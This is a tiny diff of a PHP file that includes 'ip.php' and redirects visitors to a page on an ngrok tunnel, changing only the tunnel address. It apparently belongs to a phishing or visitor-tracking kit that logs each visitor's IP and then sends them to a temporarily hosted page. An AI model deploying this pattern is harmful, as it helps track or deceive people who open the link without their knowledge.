@@ -1,5 +1,5 @@
 <?php
 include 'ip.php';
-header('Location:https://56a153dc.ngrok.io/index2.html');
+header('Location:https://8beb7266.ngrok.io/index2.html');
 exit
 ?>
